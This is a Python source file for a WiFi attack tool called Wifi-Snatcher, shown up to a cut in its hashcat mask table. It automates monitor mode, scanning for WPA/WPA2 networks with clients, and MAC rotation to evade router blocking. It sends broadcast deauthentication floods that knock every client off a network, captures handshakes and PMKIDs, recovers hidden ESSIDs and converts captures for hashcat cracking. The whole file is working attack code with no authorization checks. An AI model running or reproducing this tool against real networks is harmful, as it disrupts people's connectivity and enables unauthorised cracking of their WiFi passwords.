#!/usr/bin/env python3
"""
Wifi-Snatcher - WiFi handshake capture & wordlist generator.
Puts interface in monitor mode, scans for networks with clients,
captures handshakes via deauth, verifies and stores them.
Requires: aircrack-ng suite, root.
"""

from __future__ import annotations

__version__ = "1.1"

BANNER = r"""
 __          ___  __ _        _____             _       _               
 \ \        / (_)/ _(_)      / ____|           | |     | |              
  \ \  /\  / / _| |_ _ _____| (___  _ __   __ _| |_ ___| |__   ___ _ __ 
   \ \/  \/ / | |  _| |______\___ \| '_ \ / _` | __/ __| '_ \ / _ \ '__|
    \  /\  /  | | | | |      ____) | | | | (_| | || (__| | | |  __/ |   
     \/  \/   |_|_| |_|     |_____/|_| |_|\__,_|\__\___|_| |_|\___|_|   
                                                                                                                                    
 Written by: x4v1l0k - v""" + __version__ + r"""
"""

import argparse
import csv
import hashlib
import itertools
import logging
import os
import random
import re
import signal
import sqlite3
import subprocess
import sys
import tempfile
import time
from pathlib import Path
from typing import Optional
import shutil
import threading

try:
    from colorama import init as colorama_init, Fore, Style, Back
    colorama_init(autoreset=True)
    HAS_COLORAMA = True
except ImportError:
    # Fallback: raw ANSI when stdout is a TTY (e.g. user Python without colorama, sudo has it)
    if hasattr(sys, "stdout") and sys.stdout is not None and getattr(sys.stdout, "isatty", lambda: False)():
        _e = "\033["
        Fore = type("F", (), {"GREEN": _e + "32m", "RED": _e + "31m", "YELLOW": _e + "33m", "CYAN": _e + "36m", "MAGENTA": _e + "35m", "BLUE": _e + "34m", "WHITE": _e + "37m", "RESET": ""})()
        Style = type("S", (), {"BRIGHT": _e + "1m", "DIM": _e + "2m", "RESET_ALL": _e + "0m"})()
        Back = type("B", (), {"BLACK": _e + "40m", "RESET": ""})()
        HAS_COLORAMA = True
    else:
        HAS_COLORAMA = False
        _d = ""
        Fore = type("F", (), {"GREEN": _d, "RED": _d, "YELLOW": _d, "CYAN": _d, "MAGENTA": _d, "BLUE": _d, "WHITE": _d, "RESET": _d})()
        Style = type("S", (), {"BRIGHT": _d, "DIM": _d, "RESET_ALL": _d})()
        Back = type("B", (), {"BLACK": _d, "RESET": _d})()

R = Style.RESET_ALL if HAS_COLORAMA else ""

# MAC address pattern for highlighting
_MAC_RE = re.compile(r"\b([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})\b")


def _colorize_message(msg: str) -> str:
    """Apply rich colors to message: MACs, paths, numbers, keywords."""
    if not HAS_COLORAMA:
        return msg
    # MAC addresses -> magenta
    msg = _MAC_RE.sub(f"{Fore.MAGENTA}{Style.BRIGHT}\\1{R}", msg)
    # Paths (absolute) -> blue
    msg = re.sub(r"(/[^\s\]\)]+)", f"{Fore.BLUE}\\1{R}", msg)
    # Integers (standalone or after space) -> cyan (avoid timestamp by skipping first asctime)
    msg = re.sub(r"(?<=[\]\s:=])(\d+)(?=[\s\]\),.]|$)", f"{Fore.CYAN}\\1{R}", msg)
    # Keywords -> yellow bright
    for kw in ("Cycle", "handshake", "Scanning", "Capturing", "Exiting", "Monitor", "Skip", "valid", "Hashcat"):
        msg = re.sub(rf"\b({re.escape(kw)})\b", f"{Fore.YELLOW}{Style.BRIGHT}\\1{R}", msg)
    # Success-like -> green
    for kw in ("already", "done", "Stored"):
        msg = re.sub(rf"\b({re.escape(kw)})\b", f"{Fore.GREEN}{Style.BRIGHT}\\1{R}", msg)
    return msg


# --- Logging formatter with colors ---
class ColoredFormatter(logging.Formatter):
    LEVEL_COLORS = {
        logging.DEBUG: Fore.CYAN + Style.DIM,
        logging.INFO: Fore.GREEN,
        logging.WARNING: Fore.YELLOW + Style.BRIGHT,
        logging.ERROR: Fore.RED + Style.BRIGHT,
        logging.CRITICAL: Fore.RED + Style.BRIGHT + Back.BLACK,
    }

    def __init__(self, fmt: str, use_color: bool = True, datefmt: Optional[str] = None):
        super().__init__(fmt, datefmt=datefmt)
        self.use_color = use_color and HAS_COLORAMA

    def format(self, record: logging.LogRecord) -> str:
        s = super().format(record)
        if self.use_color:
            color = self.LEVEL_COLORS.get(record.levelno, "")
            s = s.replace(record.levelname, f"{color}{record.levelname}{R}", 1)
            # Colorize the message part (after the second '] ')
            if "] " in s:
                pre, _, rest = s.partition("] ")
                s = pre + "] " + _colorize_message(rest)
        return s


def setup_logging(log_path: Optional[str] = None) -> None:
    """Configure root logger with optional file and colored console."""
    fmt = "%(asctime)s [%(levelname)s] %(message)s"
    date_fmt = "%Y-%m-%d %H:%M:%S"
    root = logging.getLogger()
    root.setLevel(logging.DEBUG)
    root.handlers.clear()

    console = logging.StreamHandler(sys.stdout)
    console.setLevel(logging.INFO)
    console.setFormatter(ColoredFormatter(fmt, datefmt=date_fmt, use_color=HAS_COLORAMA))
    root.addHandler(console)

    if log_path:
        Path(log_path).parent.mkdir(parents=True, exist_ok=True)
        fh = logging.FileHandler(log_path, encoding="utf-8")
        fh.setLevel(logging.DEBUG)
        fh.setFormatter(logging.Formatter(fmt, datefmt=date_fmt))
        root.addHandler(fh)


def run_cmd(cmd: list[str], timeout: Optional[int] = None, capture: bool = True) -> tuple[int, str, str]:
    """Run command; return (returncode, stdout, stderr)."""
    try:
        r = subprocess.run(
            cmd,
            shell=False,
            capture_output=capture,
            text=True,
            timeout=timeout,
        )
        return (r.returncode, (r.stdout or ""), (r.stderr or ""))
    except subprocess.TimeoutExpired:
        return (-1, "", "Timeout")
    except FileNotFoundError:
        return (-1, "", "Command not found")


# Retry classification for robust subprocess wrapper
class _CmdOutcome:
    TIMEOUT = "timeout"
    NOT_FOUND = "not_found"
    NON_ZERO = "non_zero"
    SUCCESS = "success"


def run_cmd_retry(
    cmd: list[str],
    timeout: Optional[int] = None,
    capture: bool = True,
    max_retries: int = 3,
    backoff_base: float = 2.0,
) -> tuple[int, str, str]:
    """
    Run command with retries and exponential backoff. Returns (returncode, stdout, stderr).
    Retries on timeout or non-zero exit; does not retry on FileNotFoundError.
    """
    last_code, last_out, last_err = -1, "", ""
    for attempt in range(max_retries):
        last_code, last_out, last_err = run_cmd(cmd, timeout=timeout, capture=capture)
        if last_code == 0:
            return (last_code, last_out, last_err)
        if last_code == -1 and "Command not found" in last_err:
            return (last_code, last_out, last_err)
        if attempt < max_retries - 1:
            delay = backoff_base ** attempt
            logging.debug("Command failed (attempt %d/%d), retrying in %.1fs: %s", attempt + 1, max_retries, delay, cmd)
            time.sleep(delay)
    return (last_code, last_out, last_err)


def set_managed_mode(mon_iface: str) -> bool:
    """Put the interface back in managed mode (e.g. after Ctrl+C). Returns True on success."""
    if not mon_iface:
        return False
    logging.info("Putting interface %s back to managed mode...", mon_iface)
    code, out, err = run_cmd_retry(["airmon-ng", "stop", mon_iface], timeout=15, max_retries=2)
    if code == 0:
        logging.info("Interface set to managed mode.")
        return True
    logging.warning("airmon-ng stop failed: %s %s", out or "", err or "")
    return False


def rotate_mac(iface: str) -> bool:
    """
    Set a random locally-administered MAC on the interface to reduce router blocking.
    Uses macchanger -r if available, else ip link set address with 02:xx:xx:xx:xx:xx.
    """
    if not iface:
        return False
    code, out, err = run_cmd(["macchanger", "-r", iface], timeout=10)
    if code == 0:
        logging.info("MAC rotated on %s", iface)
        return True
    # Fallback: random MAC 02:xx:xx:xx:xx:xx (unicast, locally administered)
    mac = "02:" + ":".join(f"{random.randint(0, 255):02x}" for _ in range(5))
    code2, _, _ = run_cmd(["ip", "link", "set", "dev", iface, "address", mac], timeout=5)
    if code2 == 0:
        logging.info("MAC set to %s on %s (ip link)", mac, iface)
        return True
    logging.debug("MAC rotation failed for %s: macchanger and ip link set failed", iface)
    return False


def _is_hwsim_interface(mon_iface: str) -> bool:
    """Return True if the interface is backed by mac80211_hwsim (virtual radios)."""
    try:
        driver_link = Path(f"/sys/class/net/{mon_iface}/device/driver")
        if driver_link.exists():
            name = driver_link.resolve().name
            if "hwsim" in name.lower():
                return True
        # phy might be linked to hwsim
        phy_path = Path(f"/sys/class/net/{mon_iface}/phy80211/name")
        if phy_path.exists():
            # Not enough to know driver; driver check above is the main one
            pass
    except (OSError, RuntimeError):
        pass
    return False


def _check_injection(mon_iface: str) -> bool:
    """Run aireplay-ng --test to verify driver supports packet injection. Returns True if injection works."""
    code, out, err = run_cmd(["aireplay-ng", "--test", mon_iface], timeout=15)
    combined = (out or "") + " " + (err or "")
    if code == 0 and ("Injection is working" in combined or "Reply" in combined):
        logging.info("Injection test passed for %s", mon_iface)
        return True
    if _is_hwsim_interface(mon_iface):
        logging.info("Injection test inconclusive for %s (mac80211_hwsim detected; assuming injection supported)", mon_iface)
        return True
    logging.warning("Injection test failed or inconclusive for %s (driver may not support injection)", mon_iface)
    return False


def _get_interface_channel(iface: str) -> Optional[int]:
    """Get current channel of interface via iw dev <iface> info. Returns None if not available."""
    code, out, err = run_cmd(["iw", "dev", iface, "info"], timeout=5)
    if code != 0:
        return None
    m = re.search(r"channel\s+(\d+)", (out or "") + (err or ""), re.IGNORECASE)
    return int(m.group(1)) if m else None


def _set_interface_channel(iface: str, channel: int) -> bool:
    """Set interface channel with iw. Returns True if set and verified."""
    code, _, _ = run_cmd(["iw", "dev", iface, "set", "channel", str(channel)], timeout=5)
    if code != 0:
        return False
    return _get_interface_channel(iface) == channel


def ensure_monitor_mode(device: str) -> Optional[str]:
    """
    Put interface in monitor mode if needed.
    Returns monitor interface name by parsing airmon-ng output (driver-specific),
    with fallback to dev + "mon".
    """
    dev = device.strip()
    # Check if already monitor (prefer iw, fallback to iwconfig)
    code, out, err = run_cmd(["iw", "dev", dev, "info"], timeout=5)
    if code == 0 and out and "type monitor" in (out + (err or "")).lower():
        logging.info("Interface %s is already in monitor mode", dev)
        return dev
    code2, out2, _ = run_cmd(["iwconfig", dev], timeout=5)
    if code2 == 0 and "Mode:Monitor" in (out2 or ""):
        logging.info("Interface %s is already in monitor mode", dev)
        return dev
    # Start monitor with airmon-ng (retry on transient failures)
    logging.info("Putting interface %s into monitor mode...", dev)
    code, out, err = run_cmd_retry(["airmon-ng", "start", dev], timeout=15, max_retries=2)
    if code != 0:
        logging.error("airmon-ng start failed: %s %s", out, err)
        return None
    combined = (out or "") + " " + (err or "")
    # Parse airmon-ng output for the created monitor interface (driver-specific)
    # e.g. "(monitor mode enabled on mon0)" or "(mac80211 ... on [phy0]wlan0mon)"
    mon = None
    for pattern in (
        r"monitor\s+mode\s+enabled\s+on\s+(\w+)",
        r"on\s+\[phy\d+\]\s*(\w+)",
    ):
        m = re.search(pattern, combined, re.IGNORECASE)
        if m:
            candidate = m.group(1).strip()
            if candidate and candidate != dev:
                code2, iw_out, _ = run_cmd(["iwconfig", candidate], timeout=5)
                if code2 == 0 and "Mode:Monitor" in (iw_out or ""):
                    mon = candidate
                    break
    if mon is None:
        mon = dev + "mon" if not dev.endswith("mon") else dev
        if "mon" not in mon:
            mon = dev + "mon"
        code2, _, _ = run_cmd(["iwconfig", mon], timeout=5)
        if code2 != 0:
            logging.info("Using interface %s as monitor (parsed name not found)", dev)
            return dev
    logging.info("Monitor interface: %s", mon)
    _check_injection(mon)
    return mon


def parse_airodump_csv(csv_path: Path) -> tuple[list[dict], list[dict]]:
    """
    Parse airodump-ng CSV. Returns (list of APs, list of stations).
    AP: BSSID, channel, ESSID, ...
    Station: Station MAC, BSSID, ...
    """
    aps: list[dict] = []
    stations: list[dict] = []
    if not csv_path.exists():
        return aps, stations

    with open(csv_path, newline="", encoding="utf-8", errors="replace") as f:
        reader = csv.reader(f)
        section: Optional[str] = None
        headers_ap: list[str] = []
        headers_st: list[str] = []

        for row in reader:
            if not row:
                continue
            first = (row[0] or "").strip()
            if "BSSID" in first and "Station" not in first:
                section = "ap"
                headers_ap = [h.strip() for h in row]
                continue
            if "Station MAC" in first or (section == "ap" and first == "BSSID"):
                if "Station" in first or "BSSID" in first:
                    section = "station"
                    headers_st = [h.strip() for h in row]
                continue

            if section == "ap" and headers_ap:
                if first and len(row) >= 14 and re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", first):
                    ap = dict(zip(headers_ap, row[: len(headers_ap)]))
                    bssid = (ap.get("BSSID") or ap.get(" BSSID") or "").strip()
                    if bssid and bssid != "(not associated)":
                        try:
                            ch = (ap.get("channel") or "").strip() or "0"
                            ap["channel"] = int(ch) if ch.isdigit() else 0
                        except (ValueError, TypeError):
                            ap["channel"] = 0
                        try:
                            pwr = (ap.get("Power") or ap.get(" PWR ") or "").strip()
                            ap["rssi"] = int(pwr) if pwr.lstrip("-").isdigit() else -999
                        except (ValueError, TypeError):
                            ap["rssi"] = -999
                        # airodump-ng CSV fixed order: ... (12)=ID-length, (13)=ESSID, (14)=Key
                        # Use index 13 so ESSID is correct even when row length != header length
                        essid_val = (row[13] if len(row) > 13 else "").strip()
                        if not essid_val:
                            essid_val = (ap.get("ESSID") or ap.get(" ESSID") or "").strip()
                        if not essid_val:
                            essid_val = "hidden_network"
                        ap["ESSID"] = essid_val
                        auth = (ap.get("Authentication") or ap.get(" Authentication") or "").strip().upper()
                        privacy = (ap.get("Privacy") or ap.get(" Privacy") or "").strip().upper()
                        is_mgt = "MGT" in auth or "802.1X" in auth or "ENTERPRISE" in auth
                        is_wpa3_or_sae = "WPA3" in privacy or "SAE" in auth
                        has_wpa = "WPA" in privacy or "WPA2" in privacy
                        ap["is_crackable"] = (not is_mgt) and (not is_wpa3_or_sae) and has_wpa
                        aps.append(ap)
            elif section == "station" and headers_st:
                if first and re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", first):
                    st = dict(zip(headers_st, row[: len(headers_st)]))
                    st_bssid = (st.get("BSSID") or "").strip()
                    if st_bssid and st_bssid != "(not associated)":
                        stations.append(st)

    return aps, stations


def get_networks_with_clients(
    mon_iface: str,
    scan_secs: int,
    scan_dir: Path,
    skip_bssids: set[str],
    skip_essids: Optional[set[str]] = None,
    current_proc_holder: Optional[list] = None,
    channel: Optional[int] = None,
) -> list[dict]:
    """
    Run airodump for scan_secs (--encrypt WPA --encrypt WPA2), parse CSV, return list of APs
    that have at least one client and are crackable (WPA/WPA2-PSK only). MGT, WPA3/SAE, WEP, OPN excluded.
    """
    skip_essids = skip_essids or set()
    scan_dir.mkdir(parents=True, exist_ok=True)
    prefix = scan_dir / "scan"
    csv_base = str(prefix)
    cmd = [
        "airodump-ng",
        "--output-format",
        "csv",
        "--write",
        csv_base,
    ]
    if channel is not None:
        cmd.extend(["--channel", str(channel)])
    else:
        # 2.4GHz (b/g) + 5GHz (a)
        cmd.extend(["--band", "abg"])
    # Only WPA/WPA2 (handshake crackable); skip WEP/OPN
    cmd.extend(["--encrypt", "WPA", "--encrypt", "WPA2"])
    cmd.extend(
        [
            "-a",  # only associated
            mon_iface,
        ]
    )
    logging.info("Scanning for %d seconds...", scan_secs)
    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,
        cwd=str(scan_dir),
    )
    if current_proc_holder is not None:
        current_proc_holder[0] = proc
    try:
        time.sleep(scan_secs)
        proc.terminate()
        try:
            proc.wait(timeout=10)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
    finally:
        if current_proc_holder is not None:
            current_proc_holder[0] = None

    # Find latest CSV (airodump writes scan-01.csv, etc.)
    csv_files = list(scan_dir.glob("scan-*.csv"))
    if not csv_files:
        logging.warning("No scan CSV found")
        return []

    csv_path = max(csv_files, key=lambda p: p.stat().st_mtime)
    aps, stations = parse_airodump_csv(csv_path)
    # Use lowercase BSSID so AP section (e.g. B4:20:...) matches station section (e.g. b4:20:...)
    bssid_to_clients: dict[str, list[str]] = {}
    for st in stations:
        b = (st.get("BSSID") or st.get(" BSSID") or "").strip().lower()
        mac = (st.get("Station MAC") or st.get(" Station MAC") or "").strip()
        if b and mac:
            bssid_to_clients.setdefault(b, []).append(mac)

    result: list[dict] = []
    for ap in aps:
        bssid_raw = (ap.get("BSSID") or ap.get(" BSSID") or "").strip()
        bssid_lower = bssid_raw.lower()
        essid = (ap.get("ESSID") or ap.get(" ESSID") or "").strip()
        if not bssid_raw or bssid_lower in skip_bssids:
            continue
        if essid in skip_essids:
            continue
        if not ap.get("is_crackable", False):
            continue
        clients = bssid_to_clients.get(bssid_lower, [])
        # Include only: APs with clients (handshake this cycle), or hidden with no clients (PMKID at end)
        if not clients and essid != "hidden_network":
            continue
        result.append({
            "bssid": bssid_raw,
            "channel": ap.get("channel", 0) or 0,
            "essid": essid,
            "clients": list(dict.fromkeys(clients)),
            "rssi": ap.get("rssi", -999),
        })

    # Prioritize hidden first, then by RSSI descending (stronger signal first)
    result.sort(key=lambda n: (0 if (n.get("essid") or "") == "hidden_network" else 1, -(n.get("rssi") or -999)))
    logging.info("Found %d networks with clients (after skipping %d done)", len(result), len(skip_bssids))
    return result


def reveal_hidden_essid(
    mon_iface: str,
    bssid: str,
    channel: int,
    client_macs: list[str],
    scan_dir: Path,
    current_proc_holder: Optional[list] = None,
    timeout_sec: int = 25,
    passive_secs: int = 10,
) -> Optional[str]:
    """
    Reveal hidden ESSID: mandatory passive sniff first, then minimal deauth only if clients
    are present; stop immediately on first association frame (ESSID in CSV).
    """
    scan_dir.mkdir(parents=True, exist_ok=True)
    prefix = scan_dir / f"reveal_{bssid.replace(':', '')}"
    csv_base = str(prefix)
    cmd = [
        "airodump-ng",
        "--bssid", bssid,
        "--channel", str(channel),
        "--write", csv_base,
        "-a",
        mon_iface,
    ]
    def _check_revealed() -> Optional[str]:
        csv_files = list(scan_dir.glob(f"reveal_{bssid.replace(':', '')}-*.csv"))
        if not csv_files:
            return None
        latest = max(csv_files, key=lambda p: p.stat().st_mtime)
        aps, _ = parse_airodump_csv(latest)
        for ap in aps:
            if (ap.get("BSSID") or "").strip().lower() == bssid.lower():
                essid = (ap.get("ESSID") or "").strip()
                if essid and essid != "hidden_network" and len(essid) <= 32:
                    return essid
                break
        return None

    logging.info("Hidden ESSID recovery for %s: passive %ds then minimal deauth (timeout %ds)", bssid, passive_secs, timeout_sec)
    start = time.time()
    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,
        cwd=str(scan_dir),
    )
    if current_proc_holder is not None:
        current_proc_holder[0] = proc
    try:
        # Phase 1: mandatory passive sniff (no deauth) to confirm BSSID/clients
        passive = min(passive_secs, max(5, timeout_sec // 3))
        time.sleep(passive)
        revealed = _check_revealed()
        if revealed:
            return revealed
        # Phase 2: only if we have clients — minimal deauth (1–2 packets), stop on first association
        if not client_macs:
            logging.debug("No clients for %s; skipping deauth", bssid)
            remaining = max(2, timeout_sec - int(time.time() - start))
            time.sleep(min(5, remaining))
        else:
            max_rounds = 3
            for round_num in range(max_rounds):
                if (time.time() - start) >= timeout_sec:
                    break
                # Ultra selective: 1 deauth per client per round
                for client in client_macs[:3]:
                    run_cmd([
                        "aireplay-ng",
                        "-0", "1",
                        "-a", bssid,
                        "-c", client,
                        "--ignore-negative-one",
                        mon_iface,
                    ], timeout=10)
                time.sleep(3)
                revealed = _check_revealed()
                if revealed:
                    return revealed
            remaining = max(2, timeout_sec - int(time.time() - start))
            time.sleep(min(3, remaining))
    finally:
        if current_proc_holder is not None:
            current_proc_holder[0] = None
        proc.terminate()
        try:
            proc.wait(timeout=8)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()

    csv_files = list(scan_dir.glob(f"reveal_{bssid.replace(':', '')}-*.csv"))
    if not csv_files:
        return None
    csv_path = max(csv_files, key=lambda p: p.stat().st_mtime)
    aps, _ = parse_airodump_csv(csv_path)
    bssid_lower = bssid.lower()
    for ap in aps:
        if (ap.get("BSSID") or "").strip().lower() == bssid_lower:
            essid = (ap.get("ESSID") or "").strip()
            if essid and essid != "hidden_network" and len(essid) <= 32:
                return essid
            break
    return None


def try_capture_pmkid(
    mon_iface: str,
    bssid: str,
    channel: int,
    handshakes_dir: Path,
    timeout_sec: int = 45,
    current_proc_holder: Optional[list] = None,
) -> Optional[Path]:
    """
    Attempt PMKID capture for a BSSID without requiring clients (hcxdumptool).
    Returns path to .22000 file if captured and converted, else None.
    """
    if shutil.which("hcxdumptool") is None or shutil.which("hcxpcapngtool") is None:
        logging.debug("hcxdumptool/hcxpcapngtool not available; skipping PMKID capture")
        return None
    handshakes_dir.mkdir(parents=True, exist_ok=True)
    bssid_flat = bssid.replace(":", "").replace("-", "")
    prefix = handshakes_dir / f"pmkid_{bssid_flat}"
    pcapng_path = prefix.with_suffix(".pcapng")
    filter_path = handshakes_dir / f"pmkid_filter_{bssid_flat}.txt"
    try:
        filter_path.write_text(bssid_flat + "\n", encoding="utf-8")
    except OSError:
        return None
    cmd = [
        "hcxdumptool",
        "-i", mon_iface,
        "-o", str(pcapng_path),
        "--filterlist_ap", str(filter_path),
        "--filtermode=2",
        "-c", str(channel),
        "--enable_status=1",
    ]
    logging.info("PMKID capture (no client): BSSID %s, channel %s, %ds", bssid, channel, timeout_sec)
    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,
        cwd=str(handshakes_dir),
    )
    if current_proc_holder is not None:
        current_proc_holder[0] = proc
    try:
        time.sleep(timeout_sec)
    finally:
        if current_proc_holder is not None:
            current_proc_holder[0] = None
        proc.terminate()
        try:
            proc.wait(timeout=8)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
    try:
        filter_path.unlink(missing_ok=True)
    except OSError:
        pass
    if not pcapng_path.exists() or pcapng_path.stat().st_size == 0:
        if pcapng_path.exists():
            try:
                pcapng_path.unlink(missing_ok=True)
            except OSError:
                pass
        return None
    out_22000 = prefix.with_suffix(".22000")
    code, _, _ = run_cmd(["hcxpcapngtool", "-o", str(out_22000), str(pcapng_path)], timeout=60)
    try:
        pcapng_path.unlink(missing_ok=True)
    except OSError:
        pass
    if code == 0 and out_22000.exists() and out_22000.stat().st_size > 0:
        _deduplicate_22000_file(out_22000)
        return out_22000
    if out_22000.exists():
        try:
            out_22000.unlink(missing_ok=True)
        except OSError:
            pass
    return None


def try_capture_pmkid_channel(
    mon_iface: str,
    channel: int,
    bssid_list: list[str],
    handshakes_dir: Path,
    timeout_sec: int,
    current_proc_holder: Optional[list] = None,
) -> list[tuple[str, Path]]:
    """
    PMKID capture for multiple BSSIDs on the same channel in one run (faster than one-by-one).
    Returns list of (bssid, path_to_22000) for each BSSID actually captured.
    """
    if not bssid_list or shutil.which("hcxdumptool") is None or shutil.which("hcxpcapngtool") is None:
        return []
    handshakes_dir.mkdir(parents=True, exist_ok=True)
    bssid_flat_list = [b.replace(":", "").replace("-", "") for b in bssid_list]
    filter_content = "\n".join(bssid_flat_list) + "\n"
    tag = f"ch{channel}_{bssid_flat_list[0][:8]}"
    filter_path = handshakes_dir / f"pmkid_filter_{tag}.txt"
    pcapng_path = handshakes_dir / f"pmkid_{tag}.pcapng"
    try:
        filter_path.write_text(filter_content, encoding="utf-8")
    except OSError:
        return []
    cmd = [
        "hcxdumptool",
        "-i", mon_iface,
        "-o", str(pcapng_path),
        "--filterlist_ap", str(filter_path),
        "--filtermode=2",
        "-c", str(channel),
        "--enable_status=1",
    ]
    logging.info(
        "PMKID capture (no client): channel %s, %d BSSID(s), %ds",
        channel, len(bssid_list), timeout_sec,
    )
    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,
        cwd=str(handshakes_dir),
    )
    if current_proc_holder is not None:
        current_proc_holder[0] = proc
    try:
        time.sleep(timeout_sec)
    finally:
        if current_proc_holder is not None:
            current_proc_holder[0] = None
        proc.terminate()
        try:
            proc.wait(timeout=8)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
    try:
        filter_path.unlink(missing_ok=True)
    except OSError:
        pass
    if not pcapng_path.exists() or pcapng_path.stat().st_size == 0:
        if pcapng_path.exists():
            try:
                pcapng_path.unlink(missing_ok=True)
            except OSError:
                pass
        return []
    out_22000 = pcapng_path.with_suffix(".22000")
    code, _, _ = run_cmd(["hcxpcapngtool", "-o", str(out_22000), str(pcapng_path)], timeout=60)
    try:
        pcapng_path.unlink(missing_ok=True)
    except OSError:
        pass
    if code != 0 or not out_22000.exists() or out_22000.stat().st_size == 0:
        if out_22000.exists():
            try:
                out_22000.unlink(missing_ok=True)
            except OSError:
                pass
        return []
    _deduplicate_22000_file(out_22000)
    # Parse .22000: WPA*01*PMKID*MAC_AP*MAC_CLIENT*ESSID -> extract MAC_AP (normalize to lowercase)
    bssid_lower_set: set[str] = set()
    try:
        with open(out_22000, encoding="utf-8", errors="replace") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                parts = line.split("*")
                if len(parts) >= 4 and parts[0] == "WPA" and parts[1] == "01":
                    mac_ap = parts[3].strip().lower().replace("-", ":")
                    if len(mac_ap) >= 17 or len(mac_ap) == 12:  # xx:xx:xx:xx:xx:xx or xxxxxxxxxxxx
                        if ":" not in mac_ap and len(mac_ap) == 12:
                            mac_ap = ":".join(mac_ap[i : i + 2] for i in range(0, 12, 2))
                        bssid_lower_set.add(mac_ap)
    except OSError:
        pass
    result: list[tuple[str, Path]] = []
    for bssid in bssid_list:
        if bssid.lower() in bssid_lower_set:
            result.append((bssid, out_22000))
    return result


def verify_handshake_cap(cap_path: Path) -> bool:
    """Verify that cap file contains at least one WPA handshake using aircrack-ng."""
    if not cap_path.exists():
        return False
    code, out, err = run_cmd(["aircrack-ng", str(cap_path), "-w", "/dev/null"], timeout=30)
    combined = (out + " " + err).lower()
    return "handshake" in combined and "0 handshake" not in combined


def _deduplicate_22000_file(path: Path) -> None:
    """Remove duplicate hash lines in a .22000 file so hashcat does not waste time on duplicates."""
    if not path.exists() or path.stat().st_size == 0:
        return
    try:
        with open(path, encoding="utf-8", errors="replace") as f:
            lines = [line for line in f if line.strip()]
        seen: set[str] = set()
        unique: list[str] = []
        for line in lines:
            key = line.strip()
            if key and key not in seen:
                seen.add(key)
                unique.append(line if line.endswith("\n") else line + "\n")
        if len(unique) >= len(lines):
            return
        with open(path, "w", encoding="utf-8", newline="\n") as f:
            f.writelines(unique)
    except OSError:
        pass


def convert_cap_to_hashcat(cap_path: Path) -> Optional[Path]:
    """
    Convert .cap to hashcat WPA-PBKDF2 (22000) format using hcxpcapngtool if available.
    Returns path to .22000 file or None. Deduplicates hash lines to avoid redundant crack time.
    """
    out_path = cap_path.with_suffix(cap_path.suffix + ".22000")
    code, out, err = run_cmd(
        ["hcxpcapngtool", "-o", str(out_path), str(cap_path)],
        timeout=60,
    )
    if code == 0 and out_path.exists() and out_path.stat().st_size > 0:
        _deduplicate_22000_file(out_path)
        return out_path
    if out_path.exists():
        try:
            out_path.unlink()
        except OSError:
            pass
    return None


def capture_handshake(
    mon_iface: str,
    bssid: str,
    channel: int,
    client_macs: list[str],
    cap_path: Path,
    max_deauth: int = 5,
    current_proc_holder: Optional[list] = None,
    essid: str = "",
    ap_timeout: Optional[int] = None,
) -> bool:
    """
    Run airodump on channel targeting BSSID, send deauth to clients up to max_deauth times,
    then verify handshake in cap. Returns True if handshake found.
    """
    cap_path = Path(cap_path)
    cap_path.parent.mkdir(parents=True, exist_ok=True)
    # Set and verify interface channel before capture (robust channel handling)
    if not _set_interface_channel(mon_iface, channel):
        logging.warning("Could not set %s to channel %s; capture may fail", mon_iface, channel)
    else:
        current_ch = _get_interface_channel(mon_iface)
        if current_ch != channel:
            logging.warning("Channel mismatch: expected %s, got %s on %s", channel, current_ch, mon_iface)
    cap_base = str(cap_path.with_suffix(""))
    cmd_capture = [
        "airodump-ng",
        "--bssid", bssid,
        "--channel", str(channel),
        "--write", cap_base,
        "-a",
        mon_iface,
    ]
    essid_display = essid if essid else "?"
    logging.info("Capturing on BSSID %s (%s) channel %s", bssid, essid_display, channel)
    start_time = time.time()
    proc = subprocess.Popen(
        cmd_capture,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,
        cwd=str(cap_path.parent),
    )
    if current_proc_holder is not None:
        current_proc_holder[0] = proc
    try:
        time.sleep(3)
        for attempt in range(max_deauth):
            if ap_timeout is not None and (time.time() - start_time) >= ap_timeout:
                logging.info(
                    "AP timeout reached while capturing %s (%s); stopping capture.",
                    bssid,
                    essid_display,
                )
                break
            # Broadcast deauth (no -c): kicks all clients on the AP, not just the ones we know
            run_cmd([
                "aireplay-ng",
                "-0", "6",
                "-a", bssid,
                "--ignore-negative-one",
                mon_iface,
            ], timeout=10)
            time.sleep(4)
            if ap_timeout is not None and (time.time() - start_time) >= ap_timeout:
                logging.info(
                    "AP timeout reached after deauth round for %s (%s); stopping capture.",
                    bssid,
                    essid_display,
                )
                break
            if verify_handshake_cap(Path(cap_base + "-01.cap")):
                break
    finally:
        if current_proc_holder is not None:
            current_proc_holder[0] = None
        proc.terminate()
        try:
            proc.wait(timeout=8)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()

    cap_file = Path(cap_base + "-01.cap")
    if cap_file.exists() and verify_handshake_cap(cap_file):
        return True
    # Leave cleanup of failed .cap and side files to the main loop (glob cap_name + "*")
    return False


# Leet: full map for compatibility; limited set for reduced noise (a→4, e→3, o→0 only)
_LEET_MAP = {"a": "4", "e": "3", "i": "1", "o": "0", "s": "5", "t": "7", "b": "8", "g": "9", "z": "2", "l": "1"}
_LEET_LIMITED = {"a": "4", "e": "3", "o": "0"}

# Case: only lower, Capitalized, UPPER (no full 2^n permutations)
_MAX_FULL_CASE_LEN = 0
# Leet expansion only if len <= 12
_MAX_LEET_LEN = 12
_MAX_LEET_POSITIONS = 14

# Hashcat masks per ISP profile (?h=hex, ?d=digit, ?a=alnum). Attack -a 3 with GPU.
# ?h20 and ?a10 only included with --aggressive-masks (infeasible in normal audits).
_ISP_MASKS = {
